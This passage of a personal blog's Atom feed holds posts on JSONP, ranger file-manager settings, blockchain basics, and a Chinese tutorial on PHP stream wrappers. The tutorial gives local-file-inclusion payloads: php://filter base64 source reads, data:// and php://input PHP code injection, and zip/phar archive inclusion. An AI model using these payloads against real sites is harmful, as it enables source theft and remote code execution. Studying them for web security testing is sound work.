&lt;p&gt;而之所以叫 JSON Padding，是因为例如如下的简单实现，访问完远端 JS 文件中的 callfun 函数后（或称之为 API 后），&lt;strong&gt;远程的内容返回到该 HTML 文件的格式为使用 JSON 的数据封装&lt;/strong&gt;（例如这种格式：&lt;code&gt;callback(&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;hax&amp;quot;,&amp;quot;gender&amp;quot;:&amp;quot;Male&amp;quot;&amp;#125;)&lt;/code&gt;）&lt;/p&gt;</summary>
    
    
    
    <category term="TechLearning" scheme="https://resek4.github.io/categories/TechLearning/"/>
    
    
  </entry>
  
  <entry>
    <title>Ranger Custom Settings</title>
    <link href="https://resek4.github.io/2022/10/03/Ranger/"/>
    <id>https://resek4.github.io/2022/10/03/Ranger/</id>
    <published>2022-10-02T16:00:00.000Z</published>
    <updated>2023-02-26T05:25:33.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><blockquote><p>If you want to custom your ranger,you should do the below changes:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In your .zshrc</span></span><br><span class="line"><span class="built_in">export</span> RANGER_LOAD_DEFAULT_RC=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In the console</span></span><br><span class="line">ranger --copy-config=all</span><br></pre></td></tr></table></figure><p>then,you’ll see the default configretion in <code>.config/ranger</code> folder,also the <code>rc.conf</code></p></blockquote><table><thead><tr><th align="center">filename</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">rc.conf</td><td align="center">The ranger configuration</td></tr><tr><td align="center">rifle.conf</td><td align="center">The default application to open a file</td></tr><tr><td align="center">scope.sh</td><td align="center">Define how to scope a file in ranger</td></tr><tr><td align="center">commands.py</td><td align="center">Custom the commands in ranger</td></tr></tbody></table><span id="more"></span><p>1</p><ul><li>Tap <code>hjkl</code> can move the cursor</li><li>Tap <code>HJKL</code> can move the cursor to the history action place</li><li>Tap <code>[</code> <code>]</code> could get into another folder</li><li>Tap <code>zh</code> or <code>Ctrl</code>+<code>h</code> to turn on&#x2F;off the hidden files</li><li>Tap <code>o</code> to sort the files with some rules(we can use <code>oa</code> <code>ob</code>,etc…)</li><li>Tap <code>/</code> to search the file in the current folder (We can custom <code>+</code> <code>-</code> to jump to the next result)</li><li>Tap <code>Shift</code>+<code>s</code> to get into a cursor file</li><li>Tap <code>yp</code> to copy the filepath to the clipboard</li><li>Tap <code>cw</code> to rename the file</li><li>Tap <code>yy</code> to copy a file</li><li>Tap <code>pp</code> to paste a copied file</li><li>Tap <code>dd</code> to cut a file</li><li>Tap <code>dD</code> to delete a file</li><li>Tap <code>w</code> to get the task board(And tap <code>dd</code> can cancel a task)</li><li>Tap <code>v</code> to select all the files in the current folder</li></ul><h1 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h1><p>You can get the plugins on ranger’s official GitHub page: <a href="https://github.com/ranger/ranger/wiki/Plugins">Ranger Plugins</a></p><h2 id="ranger-devicons2"><a href="#ranger-devicons2" class="headerlink" title="ranger-devicons2"></a><a href="https://github.com/cdump/ranger-devicons2">ranger-devicons2</a></h2><p>This plugin can add some cool icons for the different folders or files</p><ul><li>You need to install the <a href="https://github.com/ryanoasis/nerd-fonts">Nerd-fonts</a> .</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ryanoasis/nerd-fonts.git</span><br><span class="line"><span class="built_in">cd</span> ./nerd-fonts</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure><ul><li>You should change the iterm2(or another console applications) fonts.</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Pasted%20image%2020220604173550.png"></p><ul><li>You should append these lines to the <code>rc.conf</code> file</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default_linemode devicons2</span><br></pre></td></tr></table></figure><p>Finally,you’ll get the dope icons<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Pasted%20image%2020220604173716.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Basic&quot;&gt;&lt;a href=&quot;#Basic&quot; class=&quot;headerlink&quot; title=&quot;Basic&quot;&gt;&lt;/a&gt;Basic&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;If you want to custom your ranger,you should do the below changes:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# In your .zshrc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; RANGER_LOAD_DEFAULT_RC=&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# In the console&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ranger --copy-config=all&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;then,you’ll see the default configretion in &lt;code&gt;.config/ranger&lt;/code&gt; folder,also the &lt;code&gt;rc.conf&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;filename&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;rc.conf&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;The ranger configuration&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;rifle.conf&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;The default application to open a file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;scope.sh&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Define how to scope a file in ranger&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;commands.py&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Custom the commands in ranger&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="HackStyle" scheme="https://resek4.github.io/categories/HackStyle/"/>
    
    
  </entry>
  
  <entry>
    <title>详解 php 封装协议</title>
    <link href="https://resek4.github.io/2022/08/21/PHP%20%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/"/>
    <id>https://resek4.github.io/2022/08/21/PHP%20%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-08-20T16:00:00.000Z</published>
    <updated>2023-02-26T05:25:33.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a></p><ul><li><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>、 <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>、 <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> 和 <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> 的文件系统函数。 除了这些封装协议，还能通过 <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> 来注册自定义的封装协议。</p></li><li><p>各个封装协议是否能使用取决于 php.ini 里 <code>allow_url_include</code> 与 <code>allow_url_fopen</code> 的参数设置情况。</p></li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/cxvzuygauyvg.png?token=AEZI7DPRG2YEO5PVIO2WJQDC6RCFO"></p><span id="more"></span><h1 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F; 协议"></a>file:&#x2F;&#x2F; 协议</h1><ul><li><p>对 <em>php.ini</em> 中的两个参数不敏感</p></li><li><p>一般访问本地文件的时候用，最好跟绝对路径（不然会基于脚本所存在的路径进行检索）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file:// 绝对路径</span></span><br><span class="line">index.php?file=file://D:\ha\haha\hahaha.txt</span><br></pre></td></tr></table></figure></li><li><p>甚至在一些情况下，使用直接跟远端地址也可以触发文件包含漏洞</p></li></ul><h1 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F; 协议"></a>php:&#x2F;&#x2F; 协议</h1><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><ul><li>可以把 <code>php://input</code> <code>php://output</code> 理解成通用的 I&#x2F;O 数据流，而这个数据流就像一个堆栈，input，output 的东西可以在需要的时候立刻被执行</li><li>在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code> 是无效的</li><li>对 <em>php.ini</em> 中的 <code>allow_url_include</code> 参数敏感，需要为 on</li></ul><p>具体原理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 客户端就是提交一个 POST 表单 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span>  </span><br><span class="line">    name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tom&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span>  </span><br><span class="line">    age:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;22&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务器端</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">//输出name=tom&amp;age=22</span></span><br></pre></td></tr></table></figure><ul><li>如果我们确定了存在文件包含行为，且有可能要包含的文件名是由我们的输入经过 <code>file_get_contents</code> 控制的，那一般我们可以在 URL 访问的参数中写上<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://</span><br><span class="line"><span class="comment"># 然后POST包内容写上</span></span><br><span class="line">&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>官方对 php:&#x2F;&#x2F;input 的说明中，反复提到环境变量<code>$HTTP_RAW_POST_DATA</code> ，这个变量其实和 <code>file_get_contents(php://input)</code> 的内容是一样的。如果要开启这个变量，需要修改配置文件，找到 <code>always_populate_raw_post_data</code>这个选项，设置为 On ，然后重新启动 Web 服务器，就可以了。</p></blockquote><h2 id="php-x2F-x2F-output"><a href="#php-x2F-x2F-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h2><ul><li>与 input 同理<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://output&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$output</span>, <span class="string">&quot;Test-Testinggggg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><ul><li><p>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器</p></li><li><p>因为 <code>php://filter</code> 也对 <em>php.ini</em> 中的两个参数不敏感，所以在有文件包含的时候，可以尝试在 URL 中使用如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th align="center">php:&#x2F;&#x2F;filter 参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><em>resource&#x3D;</em>&lt;要过滤的数据流&gt;</td><td align="center">必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="center"><em>read&#x3D;</em>&lt;读链的过滤器&gt;</td><td align="center">可选项。可以设定一个或多个过滤器名称，以管道符分隔</td></tr><tr><td align="center"><em>write&#x3D;</em>&lt;写链的过滤器&gt;</td><td align="center">可选项。可以设定一个或多个过滤器名称，以管道符分隔</td></tr><tr><td align="center">&lt;; 两个链的过滤器&gt;</td><td align="center">任何没有以 <em>read&#x3D;</em> 或 _write&#x3D;_作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>其中不同的过滤器有<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230125001042.png" alt="image.png"></p><h2 id="php-x2F-x2F-fd"><a href="#php-x2F-x2F-fd" class="headerlink" title="php:&#x2F;&#x2F;fd"></a>php:&#x2F;&#x2F;fd</h2><ul><li>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3</li></ul><h2 id="php-x2F-x2F-memory-amp-php-x2F-x2F-temp"><a href="#php-x2F-x2F-memory-amp-php-x2F-x2F-temp" class="headerlink" title="php:&#x2F;&#x2F;memory &amp; php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;memory &amp; php:&#x2F;&#x2F;temp</h2><ul><li>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</li></ul><h1 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F; 协议"></a>data:&#x2F;&#x2F; 协议</h1><ul><li>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码</li><li>对 <em>php.ini</em> 的两个参数敏感，需要都是 on 的状态</li><li>当确定有文件包含的时候，可以如下使用<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># data://text/plain,</span></span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># data://text/plain;base64,</span></span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;<span class="built_in">base64</span>,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></li></ul><h1 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h1><ul><li><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等</li><li>对 <em>php.ini</em> 中的两个参数不敏感</li><li>当确定存在文件包含时，如下使用<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span></span><br><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\phpinfo.jpg%23phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># compress.bzip2://file.bz2</span></span><br><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\phpinfo.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment"># compress.zlib://file.gz</span></span><br><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\phpinfo.gz</span><br></pre></td></tr></table></figure></li></ul><h1 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F; 协议"></a>phar:&#x2F;&#x2F; 协议</h1><ul><li>类似与上方提到的 <code>zip:/</code> 压缩协议，phar 是归档协议</li><li>当确定存在文件包含时，如下使用<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>#待处理<br><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/zh/wrappers.php&quot;&gt;PHP: 支持的协议和封装协议 - Manual&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;PHP 带有很多内置 URL 风格的封装协议，可用于类似 &lt;a href=&quot;https://www.php.net/manual/zh/function.fopen.php&quot;&gt;fopen()&lt;/a&gt;、 &lt;a href=&quot;https://www.php.net/manual/zh/function.copy.php&quot;&gt;copy()&lt;/a&gt;、 &lt;a href=&quot;https://www.php.net/manual/zh/function.file-exists.php&quot;&gt;file_exists()&lt;/a&gt; 和 &lt;a href=&quot;https://www.php.net/manual/zh/function.filesize.php&quot;&gt;filesize()&lt;/a&gt; 的文件系统函数。 除了这些封装协议，还能通过 &lt;a href=&quot;https://www.php.net/manual/zh/function.stream-wrapper-register.php&quot;&gt;stream_wrapper_register()&lt;/a&gt; 来注册自定义的封装协议。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;各个封装协议是否能使用取决于 php.ini 里 &lt;code&gt;allow_url_include&lt;/code&gt; 与 &lt;code&gt;allow_url_fopen&lt;/code&gt; 的参数设置情况。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/cxvzuygauyvg.png?token=AEZI7DPRG2YEO5PVIO2WJQDC6RCFO&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="TechLearning" scheme="https://resek4.github.io/categories/TechLearning/"/>
    
    
  </entry>
  
  <entry>
    <title>Learn the Blockchain</title>
    <link href="https://resek4.github.io/2022/08/14/BlockLearn/"/>
    <id>https://resek4.github.io/2022/08/14/BlockLearn/</id>
    <published>2022-08-13T16:00:00.000Z</published>
    <updated>2023-02-26T05:25:33.791Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Bitcoin-Paper.jpeg" alt="Bitcoin-Paper.jpeg"></p><h1 id="Technical-terms"><a href="#Technical-terms" class="headerlink" title="Technical terms"></a>Technical terms</h1><span id="more"></span><table><thead><tr><th align="center">Word</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">Cryptocurrency</td><td align="center">加密货币</td></tr><tr><td align="center">Cryptographic Hash Function</td><td align="center">密码哈希函数</td></tr><tr><td align="center">(CR)Collision Resistance</td><td align="center">哈希碰撞</td></tr><tr><td align="center">Message Digest</td><td align="center">消息摘要</td></tr><tr><td align="center">Digital Commitment</td><td align="center">数字承诺</td></tr><tr><td align="center">Puzzle friendly</td><td align="center">Bitcion的机制之一</td></tr><tr><td align="center">Proof of work</td><td align="center">工作量证明</td></tr><tr><td align="center">Secure Hash Algorism</td><td align="center">SHA</td></tr><tr><td align="center">Asymmetric encryption algorism</td><td align="center">非对称加密</td></tr><tr><td align="center">Merkle Tree</td><td align="center">默克尔树</td></tr><tr><td align="center">Merkle Proof</td><td align="center">默克尔证明</td></tr><tr><td align="center">Binary Tree</td><td align="center">二叉树</td></tr><tr><td align="center">(TX)Transaction</td><td align="center">交易</td></tr><tr><td align="center">Root Hash</td><td align="center">根哈希</td></tr><tr><td align="center">Proof of inclusion&#x2F;membership</td><td align="center">包含证明</td></tr><tr><td align="center">(SPV)Simplified Payment Verification</td><td align="center">简化付款认证</td></tr><tr><td align="center">Genesis Block</td><td align="center">创世区块</td></tr><tr><td align="center">Full node</td><td align="center">全节点</td></tr><tr><td align="center">Light node</td><td align="center">轻节点</td></tr><tr><td align="center">Coinbase Transaction(Tx)</td><td align="center">铸币交易</td></tr><tr><td align="center">Distributed Consensus</td><td align="center">分布式共识</td></tr><tr><td align="center">Longest Valid Chain rule</td><td align="center">最长合法链原则</td></tr><tr><td align="center">Block Reward</td><td align="center">出块奖励</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="Cryptographic-Hash-Function"><a href="#Cryptographic-Hash-Function" class="headerlink" title="Cryptographic Hash Function"></a>Cryptographic Hash Function</h1><h2 id="2-Features-Collision-Resistance"><a href="#2-Features-Collision-Resistance" class="headerlink" title="2 Features: Collision Resistance"></a>2 Features: Collision Resistance</h2><p>$$A \neq\ B$$$$H(A) &#x3D; H(B)$$<br>To avoid this situation, expanding the Value space is necessary.</p><ul><li><p>One solution is appending a random number After the message A, and calculating the Hash result.</p><!-- more --><iframe src="https://www.ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html" style="width:100%;border:none; height:600px;"></iframe></li><li><p>This feature can’t be proven by math.</p></li><li><p><strong>Collision Resistance</strong> can make a message be a <strong>Message Digest</strong>, to detect the Tamper happening.</p></li></ul><h2 id="2-Features-Hiding"><a href="#2-Features-Hiding" class="headerlink" title="2 Features: Hiding"></a>2 Features: Hiding</h2><ul><li><strong>Irreversibility</strong>: You can not get the A value if you only know the H(A) itself.</li><li><strong>The effect of Digital Sealed Envelop</strong>: Because of the hiding feature, Your message can do the forecasting stuff.</li></ul><h1 id="The-principle-of-Blockchain’s-mining"><a href="#The-principle-of-Blockchain’s-mining" class="headerlink" title="The principle of Blockchain’s mining"></a>The principle of Blockchain’s mining</h1><p>To prevent the input space too small to cause the Collision Resistance problem, each block message should add a <strong>random nouce number</strong> after itself.</p><p>The miner should use the hash algorithm to calculate this random nonce number, and if the Hash result approach this situation.<br>$$H(A+nonce) \leq\ Target$$<br>This block can be put on the blockchain, And the calculation can be looked at as the <strong>Proof of Work</strong></p><ul><li>Also, The design model of blockchain should be <em>difficult to solve, but easy to verify</em></li></ul><blockquote><p>Asymmetric Encryption Algorithm<br><strong>Encryption process</strong>: A uses B’s public key to encode the message, and B uses its private key to decode it.<br><strong>Signature process</strong>: A uses its private key to encode the message, and B uses A’s public key to decode it.<br>    The Signature process was used when encapsulating a transaction(Tx) block, to prove the initiator of the transaction.<br>    The process of “encryption” was used when describing the number of transactions, to prove the actual transaction amount</p></blockquote><ul><li>The public or private key should use a great random source to ensure its randomness.</li></ul><h1 id="Data-structure"><a href="#Data-structure" class="headerlink" title="Data structure"></a>Data structure</h1><ul><li>Blockchain is a linked list using a hash pointer.</li><li>Blockchain uses the Merkle tree to create itself.</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220815050430.png"></p><blockquote><p>There are two kinds of nodes to save the transaction information.<br>Full node: Include both the Block header and the Block body.<br>Light node: Only include the Block header(according to the SPV), like the mobile application.</p></blockquote><blockquote><p>Every transaction should base on a theory: <em>Who transacting, who proving</em></p></blockquote><ul><li><p>When a light node wants to prove a transaction(Tx) is real, it should:</p><ol><li>Send a request to the full node, contains with the Tx’s hash.</li><li>The full node uses the Tx’s hash to search the entire Merkle tree’s branch and provides the <em>Red H()</em> to the light node.</li><li>The light node uses the <em>Red H()</em> and combines the currently Tx’s Hash(<em>Green H()</em>) to verify the hash of the block, until to the Root hash.</li><li>If the verify completely right, then the transaction can be proved right either.</li></ol></li><li><p>When a light node wants to prove a transaction(Tx) is not real, it should:</p><ol><li>Send a request to the full node, contains with the Tx’s hash.</li><li>The full node sorts all the blocks based on their hash values and returns Tx’s before and after blocks hash to the light node.</li><li>The light node calculates the Block Hash which combines the before and after block until to the root hash, if the root hash is the same as the current one, then this transaction is unreal(Because this transaction never exists, so the hash wasn’t changed).On the contrary, if the transaction truly existed, the result of the block hash around the Tx, mustn’t be the current one.<br>  <img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220815054207.png"></li></ol></li></ul><h1 id="Protocol"><a href="#Protocol" class="headerlink" title="Protocol"></a>Protocol</h1><h2 id="Basic-Theory"><a href="#Basic-Theory" class="headerlink" title="Basic Theory"></a>Basic Theory</h2><p>Any type of token should have two sides features:</p><ul><li>Authentication of the token’s issuer<br>To ensure the token’s reality</li><li>Transaction Log(Release Code, Transaction information, etc…)<br>To ensure the token was created by the issuer, not the copying.</li></ul><p>Each transaction has two ‘inputs’ and 1 ‘outputs’:</p><ul><li>Inputs: Coin’s source and Sender’s public key</li><li>Outputs: Receiver’s public key</li></ul><p>The coin’s source ensures this transaction’s reality.<br>The sender’s public key ensures the sender is not fake. (But attention, this public key comes from the <strong>Coinbase Block</strong>, not the sender itself)</p><p>The receiver’s public key enlights this transaction’s hash pointer. (transfer to whom).</p><blockquote><p>A block always encapsulates many transactions(Tx), all of these transactions combine into a block as a Merkle tree, and the quantity of these transactions is called the block’s height.<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20220816074502.png"></p></blockquote><p>A full node block has two parts of it: <strong>Block header</strong>, <strong>Block body</strong></p><p><strong>The Block header</strong> was made up of these below things:</p><ul><li>Blockchain version</li><li>Hash of the previous block header. (Hash pointer)</li><li>Merkle tree hash</li><li>target(nBits)</li><li>nonce</li></ul><h2 id="Consensus"><a href="#Consensus" class="headerlink" title="Consensus"></a>Consensus</h2><p>A main feature of blockchain is <strong>[[Distributed Consensus]]</strong><br>In the Bitcoin system, if it wants to reach the distributed consensus, the system must consider the membership of all nodes.<br>It can not make any decisions by the number of accounts, cause it may lead to the <strong>[[Sybil Attack]]</strong>.<br>So, using the Calculating power(By letting the miner calculate the nouce, “solve the problem”) to measure the membership is a better way to reach consensus.</p><h2 id="Longest-Valid-Chain-Rule"><a href="#Longest-Valid-Chain-Rule" class="headerlink" title="Longest Valid 